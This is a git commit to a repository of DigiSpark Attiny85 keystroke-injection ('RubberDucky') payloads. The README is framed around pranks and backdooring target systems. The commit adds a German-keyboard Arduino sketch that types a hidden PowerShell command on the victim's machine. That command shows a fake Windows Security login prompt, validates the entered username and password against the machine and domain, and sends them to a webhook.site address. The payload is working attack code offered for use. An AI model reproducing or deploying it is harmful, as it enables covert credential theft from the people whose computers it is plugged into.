b4a76942ad460abe5f52d8a3338af03e877aadfd
MimicLynx <66270684+MimicLynx@users.noreply.github.com>
2021-04-15 13:47:43 +0200

    Update README.md

--- README.md
+++ README.md
@@ -2,21 +2,21 @@
 <img src="https://i.ibb.co/jZ2wvX0/NEWEV-AT.png" width="172" height="123">
 </p>
 
-## Important !!!
+# Important !!!
 
 **All Scripts were changed to work on german Keyboards/ Windows versions via a powershell keyboard change to US Layout and back to German in the end. Change Script by [ MrDelock](https://github.com/MimicLynx/DigiSparkDELayout)**
 
-# DigiSpark Attiny85 poor man's RubberDucky
+## DigiSpark Attiny85 poor man's RubberDucky
 For people who can't buy or are too cheap to buy RubberDucky, DigiSpark Attiny85 is the solution to their problems. Because it's possible to use it as HID thanks to "DigiKeyboard.h" it can be use as keyboard to send keystrokes to computer which can be use for pranking your people to creating a backdoor in target system.
 
 
-## What's here?
+### What's here?
 I have created this repo for sharing my payloads for DigiSpark Attiny85. It's my first time programming any device and so far no fires. All the payloads are tested on Attiny85 and created on Arduino IDE.
 
-## Getting Started
+### Getting Started
 For people like me who are new to this i would suggest visiting [Maker.pro](https://maker.pro/arduino/projects/how-to-build-a-rubber-ducky-usb-with-arduino-using-a-digispark-module) for instruction on setting up development environment for Attiny85.
 
-## Payloads
+### Payloads
 Following is the list of payloads i have worked on so far
 
 >Wi-Fi password stealer: Grabs Windows saved Wi-Fi passwords and send them to your remote web server
---
+++ payloads/Windows Phisher/Zeymare_Windows_Phisher_DE.ino
@@ -0,0 +1,73 @@
+
+#include "DigiKeyboard.h"
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+void loop() {
+
+  // Open PowerShell
+   
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+
+  // Set Layout to US
+  
+  DigiKeyboard.print("Set");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("WinUserLanguageList ");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("Force en");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("US");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  // Exploit (Add your code here)
+  
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("Set");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("WinUserLanguageList ");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("Force en");
+  DigiKeyboard.sendKeyStroke(56);
+  DigiKeyboard.print("US");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {Start-Sleep -s 60;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;out-file -InputObject $pastevalue -FilePath \"$env:temp\\rake\" -Append;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri https://webhook.site/<WebHookID> -Method POST -ContentType 'text/plain' -InFile \"$env:temp\\rake\";Remove-Item -Path \"$env:temp\\rake\"}")); //payload
+  DigiKeyboard.delay(200);  
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  
+  // Set Layout to DE
+
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
+  
+
